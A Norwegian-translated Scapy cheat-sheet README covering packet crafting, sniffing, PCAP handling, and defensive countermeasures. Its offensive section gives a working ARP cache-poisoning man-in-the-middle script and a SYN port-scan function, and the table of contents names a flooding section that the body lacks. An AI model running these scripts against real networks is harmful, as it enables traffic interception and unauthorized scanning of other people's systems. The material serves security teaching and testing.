<!-- language-home-navigation -->
[🏠 Norsk Hovedside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇬🇧 English](../README.md)

---


# 🐍 Scapy - komplett jukseark

[🇹🇷 Türkçe Sürüm](translations/README.tr.md)
```
  ███████╗ ██████╗ █████╗ ██████╗ ██╗   ██╗
  ██╔════╝██╔════╝██╔══██╗██╔══██╗╚██╗ ██╔╝
  ███████╗██║     ███████║██████╔╝ ╚████╔╝ 
  ╚════██║██║     ██╔══██║██╔═══╝   ╚██╔╝  
  ███████║╚██████╗██║  ██║██║        ██║   
  ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝        ╚═╝   
       Interactive Packet Crafting, Sniffing & Forging Engine
```
<p align="center">
  <img src="https://img.shields.io/badge/Scapy-Packet_Crafting-blue?style=for-the-badge" alt="Scapy">
  <img src="https://img.shields.io/badge/Author-Philippe_Biondi-orange?style=for-the-badge" alt="secdev">
  <img src="https://img.shields.io/badge/Language-Python-green?style=for-the-badge" alt="Python">
  <img src="https://img.shields.io/badge/Category-Network_Attacks-purple?style=for-the-badge" alt="Nettverksangrep">
</p>

<p align="center">
  <b>🐍 Det ultimate Python-baserte interaktive pakkemanipuleringsverktøyet og -biblioteket som er i stand til å smi, sende, snuse, dissekere og fuzze vilkårlige nettverkspakker</b>
</p>

---

## 📋 Innholdsfortegnelse

- [Oversikt og stablelagsmodellen (`/`)](#-oversikt--stablingslagsmodellen-)
- [Installasjon](#-installasjon)
- [Starte det interaktive skallet](#-starter det interaktive skallet)
- [Crafting Network Packets](#-crafting-nettverkspakker)
  - [IP- og TCP-håndtrykk](#ip-og-tcp-håndtrykk)
  - [ICMP Ping & Traceroute](#icmp-ping--traceroute)
  - [DNS Queries & Resolution](#dns-queries--resolution)
- [Sender og mottar pakker](#-sending--mottar-pakker)
  - [Lag 3: `send()`, `sr()`, `sr1()`](#lag-3-send-sr-sr1)
  - [Lag 2: `sendp()`, `srp()`, `srp1()`](#lag-2-sendp-srp-srp1)
- [Pakkesniffing og PCAP-håndtering](#-pakkesniffing--pcap-håndtering)
  - [Capturing Live Packets (`sniff()`)](#capturing-live-packets-sniff)
  - [Lese og skrive PCAP-filer](#reading--writing-pcap-filer)
– [Offensive nettverksangrep](#-offensive-nettverksangrep)
  - [ARP Cache Poisoning (MITM)](#arp-cache-poisoning-mitm)
  - [SYN Port Scanning Script](#syn-port-scanning-script)
  - [TCP SYN / ICMP Flooding](#tcp-syn--icmp-flooding)
- [Hurtigreferansetabell](#-hurtigreferansetabell)
– [Defensive Considerations & Detection](#-defensive-considerations--detection)
– [Juridisk ansvarsfraskrivelse](#-juridisk ansvarsfraskrivelse)

---

## 🎯 Oversikt & The Stacking Layer Model (`/`)

Laget av **Philippe Biondi**, **Scapy** erstatter dusinvis av enkeltbruksnettverksverktøy (ping, traceroute, arpspoof, nmap-stubber).

Scapys geni ligger i å bruke Pythons divisjonsoperatør (`/`) for å stable protokolllag sammen:
```python
packet = Ether() / IP(dst="192.168.1.1") / TCP(dport=80, flags="S") / "Raw Payload"
```
Hvert lagfelt har fornuftige standardverdier som Scapy automatisk beregner (sjekksummer, lengder, MAC-adresser, kilde-IP).

---

## 📥 Installasjon
```bash
# Debian / Ubuntu / Kali Linux
sudo apt update && sudo apt install -y python3-scapy

# Python pip (Latest version)
pip install scapy

# Arch Linux
sudo pacman -S python-scapy
```
---

## 🚀 Starte det interaktive skallet

Start det interaktive REPL-skallet (krever root-privilegier for å smi rå sockets):
```bash
sudo scapy
```
Inspiser tilgjengelige protokoller og funksjoner inne i Scapy:
```python
>>> ls()          # List all supported network protocols (850+)
>>> ls(IP)        # List fields and defaults of the IP layer
>>> lsc()         # List available Scapy command functions
```
---

## 🛠️ Lage nettverkspakker

### IP- og TCP-håndtrykk
```python
# Create a TCP SYN packet to web port 80
syn_pkt = IP(dst="192.168.1.50") / TCP(dport=80, flags="S")
syn_pkt.show()
```
### ICMP Ping & Traceroute
```python
# Send ICMP Echo Request and await single response (sr1)
reply = sr1(IP(dst="8.8.8.8")/ICMP(), timeout=2)
if reply:
    reply.show()

# Automated graphical TCP traceroute
ans, unans = traceroute(["8.8.8.8", "1.1.1.1"], dport=443, maxttl=20)
```
### DNS-spørringer og -oppløsning
```python
# Craft raw DNS A-record query to 8.8.8.8
dns_query = IP(dst="8.8.8.8") / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
response = sr1(dns_query, verbose=False)
print(response[DNS].summary())
```
---

## 📡 Sende og motta pakker

Scapy skiller overføring med OSI Layer:

### Lag 3: `send()`, `sr()`, `sr1()`
Fungerer med kjernetilordnede Ethernet-hoder (starter på IP-laget):
- `send(pkt)`: Sender pakke på lag 3; venter ikke på svar.
- `sr(pkt)`: Sender pakker og returnerer besvarte og ubesvarte par `(ans, unans)`.
- `sr1(pkt)`: Sender pakke og returnerer kun den første svarpakken.

### Lag 2: `sendp()`, `srp()`, `srp1()`
Egendefinert Ethernet/Data-link framing (starter ved `Ether()`):
- `sendp(Ether() / IP(...), iface="eth0")`: Send rå Ethernet-ramme.
- `srp(Ether() / ARP(...))`: Send ARP-forespørsel og motta svar.

---

## 🔍 Pakkesnusing og PCAP-håndtering

### Ta opp live-pakker (`sniff()`)
```python
# Sniff 10 packets on interface eth0
pkts = sniff(iface="eth0", count=10)

# Sniff with BPF (Berkeley Packet Filter) syntax
http_pkts = sniff(filter="tcp port 80 or port 443", count=20)

# Process packets with custom callback function
def packet_callback(packet):
    if packet.haslayer(TCP):
        print(f"[{packet[IP].src}:{packet[TCP].sport}] -> [{packet[IP].dst}:{packet[TCP].dport}]")

sniff(iface="eth0", prn=packet_callback, store=0)
```
### Lese og skrive PCAP-filer
```python
# Save captured packets to standard Wireshark PCAP
wrpcap("capture.pcap", pkts)

# Read PCAP file into Scapy list
read_pkts = rdpcap("capture.pcap")
read_pkts[0].show()
```
---

## ⚔️ Offensive nettverksangrep

### ARP Cache Poisoning (MITM)
Spoof ARP-tabeller for å avskjære trafikk mellom offer og gateway:
```python
from scapy.all import *
import time

victim_ip = "192.168.1.105"
gateway_ip = "192.168.1.1"

# Craft deceptive ARP replies
victim_arp = ARP(op=2, pdst=victim_ip, psrc=gateway_ip)
gateway_arp = ARP(op=2, pdst=gateway_ip, psrc=victim_ip)

print("[*] Poisoning ARP tables...")
try:
    while True:
        send(victim_arp, verbose=False)
        send(gateway_arp, verbose=False)
        time.sleep(2)
except KeyboardInterrupt:
    print("[*] Restoring network...")
```
### SYN Port Scanning Script
```python
def scan_port(ip, port):
    pkt = IP(dst=ip) / TCP(dport=port, flags="S")
    resp = sr1(pkt, timeout=1, verbose=False)
    if resp and resp.haslayer(TCP):
        if resp[TCP].flags == 0x12: # SYN-ACK received
            print(f"[+] Port {port} is OPEN")
            # Send RST to be polite
            send(IP(dst=ip)/TCP(dport=port, flags="R"), verbose=False)

scan_port("192.168.1.1", 80)
```
---

## ⚡ Hurtigreferansetabell

| Mål | Scapy Command |
|--------|--------------|
| **Start Interactive Shell** | `sudo scapy` |
| **Inspiser protokollfelt** | `ls(IP)` eller `ls(TCP)` |
| **Send L3-pakke** | `send(IP(dst="1.1.1.1")/ICMP())` |
| **Send og motta 1. svar**| `resp = sr1(IP(dst="1.1.1.1")/ICMP())` |
| **Send L2 Ethernet Frame** | `sendp(Ether()/IP(...), iface="eth0")` |
| **Sniff med BPF-filter** | `sniff(iface="eth0", filter="icmp", count=5)` |
| **Lagre til PCAP** | `wrpcap("out.pcap", pkts)` |
| **Les fra PCAP** | `pkts = rdpcap("in.pcap")` |

---

## 🛡️ Defensive vurderinger og gjenkjenning

1. **Dynamisk ARP-inspeksjon (DAI):** Konfigurer bedriftssvitsjer med DAI og DHCP Snooping for å slippe forfalskede, gratis ARP-svar.
2. **IDS/Suricata-regler:** Raske halvåpne SYN-sveip og misformede TCP-flaggkombinasjoner (Xmas, NULL) generert av Scapy utløser standard IDS-varsler.

---

## ⚠️ Juridisk ansvarsfraskrivelse

> [!FORSIKTIG]
> Scapy kan generere misformede pakker som forårsaker tjenestenektforhold eller fanger opp private data. Det må strengt tatt brukes i autoriserte sikkerhetsvurderinger og isolerte testnettverk.